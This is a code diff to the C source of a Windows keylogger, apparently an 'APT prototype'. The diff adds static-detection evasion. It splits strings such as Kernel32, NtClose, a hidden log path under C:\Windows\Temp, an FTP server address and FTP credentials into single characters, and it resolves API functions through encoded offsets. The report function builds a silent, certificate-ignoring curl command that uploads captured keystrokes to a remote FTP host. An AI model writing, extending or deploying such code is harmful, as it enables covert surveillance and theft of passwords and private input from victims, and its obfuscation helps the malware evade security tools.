@@ -15,7 +15,6 @@ what this dll should do?
 */
 
 
-
 HMODULE Get_Module(LPCWSTR Module_Name)
 {
 	HMODULE hModule;
@@ -132,10 +131,29 @@ int report(){
 	int cr_proc_offset[] = {28,17,4,0,19,4,41,17,14,2,4,18,18,26};
 	int dll_n__t_offset[] = {39,45,29,37,37};
 	int w_4_single_offset[] = {48,0,8,19,31,14,17,44,8,13,6,11,4,40,1,9,4,2,19}; //WaitForSingleObject
+	int nt_close_offset[] = {39,19,28,11,14,18,4};	//NtClose
 	
 
+	wchar_t full_string_mod_1[100];	// L"Kernel32"
+	wchar_t part_mod_1_1[] = L"K";
+	wchar_t part_mod_1_2[] = L"e";
+	wchar_t part_mod_1_3[] = L"r";
+	wchar_t part_mod_1_4[] = L"n";
+	wchar_t part_mod_1_5[] = L"e";
+	wchar_t part_mod_1_6[] = L"l";
+	wchar_t part_mod_1_7[] = L"3";
+	wchar_t part_mod_1_8[] = L"2";
+	//printf("size of /shellcode.bin -> %d\n",sizeof(L"shellcode.bin"));
+	wcscpy(full_string_mod_1, part_mod_1_1);
+	wcscat(full_string_mod_1, part_mod_1_2);
+	wcscat(full_string_mod_1, part_mod_1_3);
+	wcscat(full_string_mod_1, part_mod_1_4);
+	wcscat(full_string_mod_1, part_mod_1_5);
+	wcscat(full_string_mod_1, part_mod_1_6);
+	wcscat(full_string_mod_1, part_mod_1_7);
+	wcscat(full_string_mod_1, part_mod_1_8);
 
-	HMODULE hK32 = Get_Module(L"Kernel32");
+	HMODULE hK32 = Get_Module(full_string_mod_1);
 	// --- START GET LoadLibraryA function ---//
 	FARPROC L_0_D_LIB = GetProcAddress(hK32,GetOriginal(lib_load_offset,ALL_ALPHANUM,sizeof(lib_load_offset)));
 	// --- END GET LoadLibraryA function ---//
@@ -161,8 +179,7 @@ int report(){
 	// --- END LOAD KERNEL32 DLL ---//
 	FARPROC cr_proc_func = GetProcAddress(hDLL_k_er_32,GetOriginal(cr_proc_offset,ALL_ALPHANUM,sizeof(cr_proc_offset)));	//CreateProcessA
 	FARPROC w_4_single_func = GetProcAddress(hDLL_k_er_32,GetOriginal(w_4_single_offset,ALL_ALPHANUM,sizeof(w_4_single_offset))); //WaitForSingleObject
-	NtCreateMutant NT_CreateMutant = (NtCreateMutant)GetProcAddress(hDLL_n__t,"NtCreateMutant");
-	NtClose NT_Close = (NtClose)GetProcAddress(hDLL_n__t,"NtClose");
+	NtClose NT_Close = (NtClose)GetProcAddress(hDLL_n__t, GetOriginal(nt_close_offset,ALL_ALPHANUM,sizeof(nt_close_offset)));	//NtClose
 	//static int fileCounter = 1;
     
 	
@@ -172,19 +189,241 @@ int report(){
     }
 	
 	//ShowWindow(GetConsoleWindow(),SW_HIDE);
-    const char *server = "192.168.100.13"; // Replace with your FTP server
-    const char *username = "ftp_user_billy";        // Replace with your FTP username
-    const char *password = "changeme";        // Replace with your FTP password
-    const char *localFile = "C:\\Users\\ameru\\Desktop\\malware\\APT prototype\\log.log";  // Local file to upload
-    const char *remoteFile = "log.log";             // Remote file name
+
+
+	char full_string_2[50];	// \\??\\C:\\Windows\\Temp\\SSS_ce1aaa99ce4bdb0101000000984b2414aa\\log.log
+	char part_string_2_1[] = "\\";
+	char part_string_2_2[] = "??";
+	char part_string_2_3[] = "\\";
+	char part_string_2_4[] = "C";
+	char part_string_2_5[] = ":";
+	char part_string_2_6[] = "\\";
+	char part_string_2_7[] = "Wi";
+	char part_string_2_8[] = "nd";
+	char part_string_2_9[] = "ow";
+	char part_string_2_10[] = "s\\";
+	char part_string_2_11[] = "T";
+	char part_string_2_12[] = "e";
+	char part_string_2_13[] = "mp\\";
+	char part_string_2_14[] = "SSS";
+	char part_string_2_15[] = "_";
+	char part_string_2_16[] = "ce";
+	char part_string_2_17[] = "1";
+	char part_string_2_18[] = "aaa";
+	char part_string_2_19[] = "99ce";
+	char part_string_2_20[] = "4bdb";
+	char part_string_2_21[] = "0101";
+	char part_string_2_22[] = "000000";
+	char part_string_2_23[] = "984b2414";
+	char part_string_2_24[] = "aa";
+	char part_string_2_25[] = "\\";
+	char part_string_2_26[] = "l";
+	char part_string_2_27[] = "o";
+	char part_string_2_28[] = "g";
+	char part_string_2_29[] = ".";
+	char part_string_2_30[] = "l";
+	char part_string_2_31[] = "o";
+	char part_string_2_32[] = "g";
+	strcpy(full_string_2, part_string_2_1);
+	strcat(full_string_2, part_string_2_2);
+	strcat(full_string_2, part_string_2_3);
+	strcat(full_string_2, part_string_2_4);
+	strcat(full_string_2, part_string_2_5);
+	strcat(full_string_2, part_string_2_6);
+	strcat(full_string_2, part_string_2_7);
+	strcat(full_string_2, part_string_2_8);
+	strcat(full_string_2, part_string_2_9);
+	strcat(full_string_2, part_string_2_10);
+	strcat(full_string_2, part_string_2_11);
+	strcat(full_string_2, part_string_2_12);
+	strcat(full_string_2, part_string_2_13);
+	strcat(full_string_2, part_string_2_14);
+	strcat(full_string_2, part_string_2_15);
+	strcat(full_string_2, part_string_2_16);
+	strcat(full_string_2, part_string_2_17);
+	strcat(full_string_2, part_string_2_18);
+	strcat(full_string_2, part_string_2_19);
+	strcat(full_string_2, part_string_2_20);
+	strcat(full_string_2, part_string_2_21);
+	strcat(full_string_2, part_string_2_22);
+	strcat(full_string_2, part_string_2_23);
+	strcat(full_string_2, part_string_2_24);
+	strcat(full_string_2, part_string_2_25);
+	strcat(full_string_2, part_string_2_26);
+	strcat(full_string_2, part_string_2_27);
+	strcat(full_string_2, part_string_2_28);
+	strcat(full_string_2, part_string_2_29);
+	strcat(full_string_2, part_string_2_30);
+	strcat(full_string_2, part_string_2_31);
+	strcat(full_string_2, part_string_2_32);
+	
+    
+	char full_string_1[100];	// log.log -> remote file name
+	char part_string_1_1[] = "l";
+	char part_string_1_2[] = "o";
+	char part_string_1_3[] = "g";
+	char part_string_1_4[] = ".";
+	char part_string_1_5[] = "l";
+	char part_string_1_6[] = "o";
+	char part_string_1_7[] = "g";
+	strcpy(full_string_1, part_string_1_1);
+	strcat(full_string_1, part_string_1_2);
+	strcat(full_string_1, part_string_1_3);
+	strcat(full_string_1, part_string_1_4);
+	strcat(full_string_1, part_string_1_5);
+	strcat(full_string_1, part_string_1_6);
+	strcat(full_string_1, part_string_1_7);
+  
+	char full_string_3[5];	// ftp
+	char part_string_3_1[] = "f";
+	char part_string_3_2[] = "t";
+	char part_string_3_3[] = "p";
+	strcpy(full_string_3, part_string_3_1);
+	strcat(full_string_3, part_string_3_2);
+	strcat(full_string_3, part_string_3_3);
+  
+  
+ 	char full_string_4[100];	// 192.168.8.161
+	char part_string_4_1[] = "1";
+	char part_string_4_2[] = "9";
+	char part_string_4_3[] = "2.";
+	char part_string_4_4[] = "1";
+	char part_string_4_5[] = "6";
+	char part_string_4_6[] = "8";
+	char part_string_4_7[] = ".";
+	char part_string_4_8[] = "8";
+	char part_string_4_9[] = ".";
+	char part_string_4_10[] = "1";
+	char part_string_4_11[] = "6";
+	char part_string_4_12[] = "1";
+	strcpy(full_string_4, part_string_4_1);
+	strcat(full_string_4, part_string_4_2);
+	strcat(full_string_4, part_string_4_3);
+	strcat(full_string_4, part_string_4_4);
+	strcat(full_string_4, part_string_4_5);
+	strcat(full_string_4, part_string_4_6);
+	strcat(full_string_4, part_string_4_7);
+	strcat(full_string_4, part_string_4_8);
+	strcat(full_string_4, part_string_4_9);
+	strcat(full_string_4, part_string_4_10);
+	strcat(full_string_4, part_string_4_11);
+	strcat(full_string_4, part_string_4_12);
+	
+ 	char full_string_5[100];	// uploads
+	char part_string_5_1[] = "u";
+	char part_string_5_2[] = "p";
+	char part_string_5_3[] = "l";
+	char part_string_5_4[] = "o";
+	char part_string_5_5[] = "a";
+	char part_string_5_6[] = "d";
+	char part_string_5_7[] = "s";
+	strcpy(full_string_5, part_string_5_1);
+	strcat(full_string_5, part_string_5_2);
+	strcat(full_string_5, part_string_5_3);
+	strcat(full_string_5, part_string_5_4);
+	strcat(full_string_5, part_string_5_5);
+	strcat(full_string_5, part_string_5_6);
+	strcat(full_string_5, part_string_5_7);
+
+ 	char full_string_6[100];	// ftp_user:123
+	char part_string_6_1[] = "f";
+	char part_string_6_2[] = "t";
+	char part_string_6_3[] = "p";
+	char part_string_6_4[] = "_";
+	char part_string_6_5[] = "u";
+	char part_string_6_6[] = "s";
+	char part_string_6_7[] = "e";
+	char part_string_6_8[] = "r";
+	char part_string_6_9[] = ":";
+	char part_string_6_10[] = "1";
+	char part_string_6_11[] = "2";
+	char part_string_6_12[] = "3";
+	strcpy(full_string_6, part_string_6_1);
+	strcat(full_string_6, part_string_6_2);
+	strcat(full_string_6, part_string_6_3);
+	strcat(full_string_6, part_string_6_4);
+	strcat(full_string_6, part_string_6_5);
+	strcat(full_string_6, part_string_6_6);
+	strcat(full_string_6, part_string_6_7);
+	strcat(full_string_6, part_string_6_8);
+	strcat(full_string_6, part_string_6_9);
+	strcat(full_string_6, part_string_6_10);
+	strcat(full_string_6, part_string_6_11);
+	strcat(full_string_6, part_string_6_12);
+	
+	char full_string_7[100];	// --ftp-ssl-reqd
+	char part_string_7_1[] = "--f";
+	char part_string_7_2[] = "t";
+	char part_string_7_3[] = "p";
+	char part_string_7_4[] = "-";
+	char part_string_7_5[] = "s";
+	char part_string_7_6[] = "s";
+	char part_string_7_7[] = "l";
+	char part_string_7_8[] = "-";
+	char part_string_7_9[] = "r";
+	char part_string_7_10[] = "e";
+	char part_string_7_11[] = "q";
+	char part_string_7_12[] = "d";
+	strcpy(full_string_7, part_string_7_1);
+	strcat(full_string_7, part_string_7_2);
+	strcat(full_string_7, part_string_7_3);
+	strcat(full_string_7, part_string_7_4);
+	strcat(full_string_7, part_string_7_5);
+	strcat(full_string_7, part_string_7_6);
+	strcat(full_string_7, part_string_7_7);
+	strcat(full_string_7, part_string_7_8);
+	strcat(full_string_7, part_string_7_9);
+	strcat(full_string_7, part_string_7_10);
+	strcat(full_string_7, part_string_7_11);
+	strcat(full_string_7, part_string_7_12);
+	
+	char full_string_8[100];	// curl.exe
+	char part_string_8_1[] = "c";
+	char part_string_8_2[] = "u";
+	char part_string_8_3[] = "r";
+	char part_string_8_4[] = "l";
+	char part_string_8_5[] = ".";
+	char part_string_8_6[] = "e";
+	char part_string_8_7[] = "x";
+	char part_string_8_8[] = "e";
+	strcpy(full_string_8, part_string_8_1);
+	strcat(full_string_8, part_string_8_2);
+	strcat(full_string_8, part_string_8_3);
+	strcat(full_string_8, part_string_8_4);
+	strcat(full_string_8, part_string_8_5);
+	strcat(full_string_8, part_string_8_6);
+	strcat(full_string_8, part_string_8_7);
+	strcat(full_string_8, part_string_8_8);
+	
+	char full_string_9[4];	// -u for --user
+	char part_string_9_1[] = "-";
+	char part_string_9_2[] = "u";
+	strcpy(full_string_9, part_string_9_1);
+	strcat(full_string_9, part_string_9_2);
+	
+	char full_string_10[4];	// -k for --insecure
+	char part_string_10_1[] = "-";
+	char part_string_10_2[] = "k";
+	strcpy(full_string_10, part_string_10_1);
+	strcat(full_string_10, part_string_10_2);
+	
+	char full_string_11[4];	// -s for --silent
+	char part_string_11_1[] = "-";
+	char part_string_11_2[] = "s";
+	strcpy(full_string_11, part_string_11_1);
+	strcat(full_string_11, part_string_11_2);
+	
+	
+	
 	char curlCommand[512];
-	//char remoteFile[256];
-    //snprintf(remoteFile, sizeof(remoteFile), "keylog%d.log", fileCounter);
+
+	//curl --ftp-ssl-reqd -T test_ftp_ssl.txt -u "ftp_user:123" "ftp://192.168.8.161/uploads/test_ftp_ssl.txt" -k -s
     snprintf(curlCommand, sizeof(curlCommand),
-             "curl.exe -T \"%s\" ftp://192.168.100.13/upload/%s --user ftp_user_billy:changeme --silent",
-             localFile, remoteFile);
-			 
-    // Initialize the STARTUPINFO structure
+             "%s %s -T \"%s\" %s://%s/%s/%s %s \"%s\" %s %s",
+             full_string_8,full_string_7,full_string_2,full_string_3,full_string_4,full_string_5,full_string_1,full_string_9,full_string_6,full_string_10,full_string_11);
+    
+	
+	// Initialize the STARTUPINFO structure
     STARTUPINFO si = { sizeof(si) };
     PROCESS_INFORMATION pi;
 	//MessageBoxA(NULL, "SENDING LOG FILE", "Debug", MB_OK);
@@ -215,8 +454,67 @@ int report(){
 void LogKeystroke(DWORD key) {
     static int i = 0;
 	
+	char full_string_1[100];  //	C:\\Windows\\Temp\\SSS_ce1aaa99ce4bdb0101000000984b2414aa\\log.log
+	char part_1_1[] = "C";
+	char part_1_2[] = ":";
+	char part_1_3[] = "\\";
+	char part_1_4[] = "Wi";
+	char part_1_5[] = "nd";
+	char part_1_6[] = "ow";
+	char part_1_7[] = "s\\";
+	char part_1_8[] = "T";
+	char part_1_9[] = "e";
+	char part_1_10[] = "mp\\";
+	char part_1_11[] = "SSS";
+	char part_1_12[] = "_";
+	char part_1_13[] = "ce";
+	char part_1_14[] = "1";
+	char part_1_15[] = "aaa";
+	char part_1_16[] = "99ce";
+	char part_1_17[] = "4bdb";
+	char part_1_18[] = "0101";
+	char part_1_19[] = "000000";
+	char part_1_20[] = "984b2414";
+	char part_1_21[] = "aa";
+	char part_1_22[] = "\\";
+	char part_1_23[] = "l";
+	char part_1_24[] = "o";
+	char part_1_25[] = "g";
+	char part_1_26[] = ".";
+	char part_1_27[] = "l";
+	char part_1_28[] = "o";
+	char part_1_29[] = "g";
+	strcpy(full_string_1, part_1_1);
+	strcat(full_string_1, part_1_2);
+	strcat(full_string_1, part_1_3);
+	strcat(full_string_1, part_1_4);
+	strcat(full_string_1, part_1_5);
+	strcat(full_string_1, part_1_6);
+	strcat(full_string_1, part_1_7);
+	strcat(full_string_1, part_1_8);
+	strcat(full_string_1, part_1_9);
+	strcat(full_string_1, part_1_10);
+	strcat(full_string_1, part_1_11);
+	strcat(full_string_1, part_1_12);
+	strcat(full_string_1, part_1_13);
+	strcat(full_string_1, part_1_14);
+	strcat(full_string_1, part_1_15);
+	strcat(full_string_1, part_1_16);
+	strcat(full_string_1, part_1_17);
+	strcat(full_string_1, part_1_18);
+	strcat(full_string_1, part_1_19);
+	strcat(full_string_1, part_1_20);
+	strcat(full_string_1, part_1_21);
+	strcat(full_string_1, part_1_22);
+	strcat(full_string_1, part_1_23);
+	strcat(full_string_1, part_1_24);
+	strcat(full_string_1, part_1_25);
+	strcat(full_string_1, part_1_26);
+	strcat(full_string_1, part_1_27);
+	strcat(full_string_1, part_1_28);
+	strcat(full_string_1, part_1_29);
 	if (logFile == NULL) {
-        logFile = fopen("log.log", "a"); // Open the log file in append mode
+        logFile = fopen(full_string_1, "a"); // Open the log file in append mode
         if (logFile == NULL) {
             //printf("Failed to open log file! Error\n");
             return;
@@ -436,13 +734,33 @@ int MAIN_LOGIC(){
 	int dll_n__t_offset[] = {39,45,29,37,37};
 	int cr_proc_offset[] = {28,17,4,0,19,4,41,17,14,2,4,18,18,26};
 	int w_4_single_offset[] = {48,0,8,19,31,14,17,44,8,13,6,11,4,40,1,9,4,2,19}; //WaitForSingleObject
-	HMODULE hK32 = Get_Module(L"Kernel32");
+	
+	
+	wchar_t full_string_mod_1[100];	// L"Kernel32"
+	wchar_t part_mod_1_1[] = L"K";
+	wchar_t part_mod_1_2[] = L"e";
+	wchar_t part_mod_1_3[] = L"r";
+	wchar_t part_mod_1_4[] = L"n";
+	wchar_t part_mod_1_5[] = L"e";
+	wchar_t part_mod_1_6[] = L"l";
+	wchar_t part_mod_1_7[] = L"3";
+	wchar_t part_mod_1_8[] = L"2";
+	//printf("size of /shellcode.bin -> %d\n",sizeof(L"shellcode.bin"));
+	wcscpy(full_string_mod_1, part_mod_1_1);
+	wcscat(full_string_mod_1, part_mod_1_2);
+	wcscat(full_string_mod_1, part_mod_1_3);
+	wcscat(full_string_mod_1, part_mod_1_4);
+	wcscat(full_string_mod_1, part_mod_1_5);
+	wcscat(full_string_mod_1, part_mod_1_6);
+	wcscat(full_string_mod_1, part_mod_1_7);
+	wcscat(full_string_mod_1, part_mod_1_8);
+	HMODULE hK32 = Get_Module(full_string_mod_1);
 	// --- START GET LoadLibraryA function ---//
 	FARPROC L_0_D_LIB = GetProcAddress(hK32,GetOriginal(lib_load_offset,ALL_ALPHANUM,sizeof(lib_load_offset)));
 	// --- END GET LoadLibraryA function ---//
 	
 
-	
+	/*
 	// --- START LOAD KERNEL32 DLL --- //
 	HMODULE hDLL_k_er_32 = L_0_D_LIB(GetOriginal(dll_k_er_32_offset,ALL_ALPHANUM,sizeof(dll_k_er_32_offset)));
 	if (hDLL_k_er_32 == NULL){
@@ -450,6 +768,7 @@ int MAIN_LOGIC(){
 		return EXIT_FAILURE;
 	}
 	// --- END LOAD KERNEL32 DLL ---//
+	*/
 	
 	// --- START LOAD user32 DLL --- //
 	HMODULE hdll_us_32 = L_0_D_LIB(GetOriginal(us__32_d_11_offset,ALL_ALPHANUM,sizeof(us__32_d_11_offset)));
@@ -478,9 +797,9 @@ int MAIN_LOGIC(){
 	FARPROC un_h_0_k_func = GetProcAddress(hdll_us_32,GetOriginal(un_h_0_k_offset,ALL_ALPHANUM,sizeof(un_h_0_k_offset))); //UnhookWindowsHookEx
 	FARPROC gt_m__5__g_func = GetProcAddress(hdll_us_32,GetOriginal(gt_m__5__g_offset,ALL_ALPHANUM,sizeof(gt_m__5__g_offset))); //GetMessage
 	FARPROC trn_m__5__g_func = GetProcAddress(hdll_us_32,GetOriginal(trn_m__5__g_offset,ALL_ALPHANUM,sizeof(trn_m__5__g_offset))); //TranslateMessage
-	FARPROC dis_m__5__g_func = GetProcAddress(hdll_us_32,GetOriginal(trn_m__5__g_offset,ALL_ALPHANUM,sizeof(trn_m__5__g_offset))); //DispatchMessage
-	FARPROC cr_proc_func = GetProcAddress(hDLL_k_er_32,GetOriginal(cr_proc_offset,ALL_ALPHANUM,sizeof(cr_proc_offset)));	//CreateProcessA
-	FARPROC w_4_single_func = GetProcAddress(hDLL_k_er_32,GetOriginal(w_4_single_offset,ALL_ALPHANUM,sizeof(w_4_single_offset))); //WaitForSingleObject
+	FARPROC dis_m__5__g_func = GetProcAddress(hdll_us_32,GetOriginal(dis_m__5__g_offset,ALL_ALPHANUM,sizeof(dis_m__5__g_offset))); //DispatchMessage
+	FARPROC cr_proc_func = GetProcAddress(hK32,GetOriginal(cr_proc_offset,ALL_ALPHANUM,sizeof(cr_proc_offset)));	//CreateProcessA
+	FARPROC w_4_single_func = GetProcAddress(hK32,GetOriginal(w_4_single_offset,ALL_ALPHANUM,sizeof(w_4_single_offset))); //WaitForSingleObject
 	// --- END GET FUNCTOINS --- //
 	
 	// --- START CREATE MUTEX --- //
